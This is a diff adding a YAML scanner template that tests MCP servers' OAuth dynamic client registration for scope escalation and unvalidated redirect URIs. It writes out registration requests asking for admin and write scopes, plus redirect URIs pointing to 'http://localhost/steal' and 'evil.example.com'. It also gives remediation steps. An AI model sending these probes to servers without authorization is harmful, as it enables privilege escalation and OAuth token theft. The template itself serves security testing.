@@ -1,0 +1,121 @@
+id: mcp-oauth-dcr-001
+info:
+  name: MCP OAuth Dynamic Client Registration Scope Escalation
+  author: batesian
+  severity: high
+  description: |
+    Tests whether an MCP server's OAuth 2.1 dynamic client registration (DCR)
+    endpoint enforces scope restrictions. Per RFC 7591, DCR endpoints are often
+    unauthenticated by design. A vulnerable server grants a newly registered client
+    the full set of requested scopes, including administrative or write scopes,
+    without verifying legitimacy or enforcing a permitted scope policy.
+
+    This is the primary authorization attack surface in the MCP 2025-11-05 spec,
+    which mandates OAuth 2.1 with PKCE and DCR for all remote MCP servers.
+
+  references:
+    - https://modelcontextprotocol.io/docs/concepts/authorization
+    - https://www.rfc-editor.org/rfc/rfc7591
+    - https://www.rfc-editor.org/rfc/rfc9700
+    - https://owasp.org/www-project-api-security/
+    - https://cwe.mitre.org/data/definitions/284.html
+    - https://cwe.mitre.org/data/definitions/269.html
+
+  tags:
+    - mcp
+    - oauth
+    - dcr
+    - scope-escalation
+    - authorization
+    - rfc7591
+    - cwe-284
+    - cwe-269
+
+attack:
+  protocol: mcp
+  type: oauth-dcr-scope-escalation
+
+  discover:
+    well_known_endpoints:
+      - "{{BaseURL}}/.well-known/oauth-authorization-server"
+      - "{{BaseURL}}/.well-known/openid-configuration"
+    extract:
+      - registration_endpoint
+      - token_endpoint
+      - scopes_supported
+
+  baseline_registration:
+    endpoint: "{{RegistrationEndpoint}}"
+    method: POST
+    headers:
+      Content-Type: application/json
+    body:
+      client_name: "batesian-probe-{{RandID}}"
+      redirect_uris:
+        - "https://batesian.invalid/callback"
+      grant_types:
+        - authorization_code
+      response_types:
+        - code
+      scope: "tools:read"
+
+  escalated_registration:
+    endpoint: "{{RegistrationEndpoint}}"
+    method: POST
+    headers:
+      Content-Type: application/json
+    body:
+      client_name: "batesian-probe-{{RandID}}"
+      redirect_uris:
+        - "https://batesian.invalid/callback"
+      grant_types:
+        - authorization_code
+      response_types:
+        - code
+      scope: "tools:read tools:write resources:write admin openid profile email"
+
+  redirect_uri_probe:
+    endpoint: "{{RegistrationEndpoint}}"
+    method: POST
+    headers:
+      Content-Type: application/json
+    body:
+      client_name: "batesian-redirect-probe-{{RandID}}"
+      redirect_uris:
+        - "https://batesian.invalid/callback"
+        - "http://localhost/steal"
+        - "https://evil.example.com/callback"
+      grant_types:
+        - authorization_code
+      scope: "tools:read"
+
+assert:
+  - condition: dcr_unauthenticated
+    description: "DCR endpoint accepted client registration without any authentication"
+    evidence: "{{BaselineResponse}}"
+    severity: medium
+
+  - condition: escalated_scopes_granted
+    description: "Server granted admin/write scopes not in the permitted scope list"
+    evidence: "{{EscalatedResponse}}"
+    severity: critical
+
+  - condition: localhost_redirect_accepted
+    description: "Server accepted a localhost or private-IP redirect URI"
+    evidence: "{{RedirectProbeResponse}}"
+    severity: high
+
+  - condition: evil_domain_redirect_accepted
+    description: "Server accepted an open redirect URI without domain validation"
+    evidence: "{{RedirectProbeResponse}}"
+    severity: high
+
+remediation: |
+  1. Require authentication for DCR (Initial Access Token per RFC 7591 §3.1),
+     or disable public DCR and use pre-registered clients.
+  2. Enforce a server-side permitted scope list; reject scopes exceeding what
+     the client class is allowed to hold.
+  3. Validate redirect_uris against an allowlist; reject localhost, private IPs,
+     and wildcard or open-redirect patterns.
+  4. Bind issued tokens to the resource server via the `aud` claim so tokens
+     cannot be replayed across different MCP endpoints.
